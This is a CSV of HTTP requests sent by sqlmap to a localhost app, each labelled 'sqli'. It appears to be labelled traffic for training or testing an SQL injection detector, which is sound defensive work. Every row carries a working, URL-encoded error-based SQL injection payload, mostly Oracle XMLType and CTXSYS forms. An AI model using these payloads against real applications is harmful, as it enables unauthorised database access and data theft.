method,url,headers,body,label
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%27%20AND%207805%3DCONCAT%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28120%29%2BCHAR%28113%29%2C%28SELECT%20%28CASE%20WHEN%20%287805%3D7805%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2CCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%29%20OR%20%27mmYV%27%3D%27NKxm,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%29%20AND%203905%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283905%3D3905%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20dYGy,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%29%20AND%203905%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283905%3D3905%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%282440%3D2440,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%29%29%20AND%203905%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283905%3D3905%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%281210%3D1210,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%29%29%29%20AND%203905%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283905%3D3905%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%28%284164%3D4164,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%20AND%203905%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283905%3D3905%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%20AND%203905%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283905%3D3905%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20ntec,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%20AND%203905%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283905%3D3905%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%23%20ktZN,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%27%20AND%203905%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283905%3D3905%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20RlNe,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%27%29%20AND%203905%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283905%3D3905%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27Rfav%27%3D%27Rfav,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%27%29%29%20AND%203905%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283905%3D3905%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%28%27vPah%27%3D%27vPah,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%27%29%29%29%20AND%203905%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283905%3D3905%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%28%28%27uDVa%27%3D%27uDVa,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%27%20AND%203905%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283905%3D3905%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27gFlA%27%3D%27gFlA,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%27%29%20AND%203905%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283905%3D3905%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27LXxA%27%20LIKE%20%27LXxA,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%27%29%29%20AND%203905%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283905%3D3905%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%28%27leEz%27%20LIKE%20%27leEz,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%25%27%20AND%203905%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283905%3D3905%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27jvtV%25%27%3D%27jvtV,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%27%20AND%203905%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283905%3D3905%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27OlzU%27%20LIKE%20%27OlzU,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%22%29%20AND%203905%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283905%3D3905%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%22EMnU%22%3D%22EMnU,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%22%29%29%20AND%203905%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283905%3D3905%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%28%22laWL%22%3D%22laWL,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%22%20AND%203905%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283905%3D3905%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%22bqnC%22%3D%22bqnC,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%22%29%20AND%203905%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283905%3D3905%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%22wwuI%22%20LIKE%20%22wwuI,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%22%20AND%203905%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283905%3D3905%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%22KvNC%22%20LIKE%20%22KvNC,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%27%20AND%203905%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283905%3D3905%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20OR%20%27wVcv%27%3D%27DwYA,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%29%20AND%204780%3DCTXSYS.DRITHSX.SN%284780%2C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284780%3D4780%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29--%20jNgu,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%29%20AND%204780%3DCTXSYS.DRITHSX.SN%284780%2C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284780%3D4780%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29%20AND%20%281650%3D1650,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%29%29%20AND%204780%3DCTXSYS.DRITHSX.SN%284780%2C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284780%3D4780%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29%20AND%20%28%282509%3D2509,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%29%29%29%20AND%204780%3DCTXSYS.DRITHSX.SN%284780%2C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284780%3D4780%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29%20AND%20%28%28%288389%3D8389,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1%20AND%204780%3DCTXSYS.DRITHSX.SN%284780%2C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284780%3D4780%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
